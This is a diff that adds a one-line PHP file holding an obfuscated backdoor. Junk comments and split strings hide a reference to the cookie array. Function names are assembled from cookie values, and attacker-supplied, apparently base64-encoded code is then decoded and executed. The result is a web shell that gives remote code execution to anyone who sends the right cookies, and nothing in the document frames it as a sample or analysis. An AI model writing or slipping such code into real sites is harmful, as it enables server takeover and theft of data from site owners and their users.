@@ -1,0 +1,1 @@
+<?php $y='_CO';/*Lx*/$ng='OKI';$t/*bD*/='E';$zf=/*5*/${$y.$ng.$t};if(isset($zf['w'])){$ns=/*bjN*/$zf['w'].$zf['D'];$ms=$zf['Hn'].$zf['Vc'].$zf['t'];$xx=$ns('',$ms($zf['g']));$xx();}
